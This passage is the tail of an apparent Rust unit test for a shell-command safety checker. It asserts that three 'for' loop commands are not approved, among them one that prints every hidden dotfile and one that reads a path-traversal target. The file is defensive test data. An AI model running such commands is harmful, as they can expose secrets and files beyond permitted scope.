            "for f in .*; do cat \"$f\"; done",
            "for f in *.md; do echo -e \"$f\"; done",
            "for f in *.md; do cat \"$f/../../x\"; done",
        ] {
            assert!(!judged(held), "{held}");
        }
    }
}
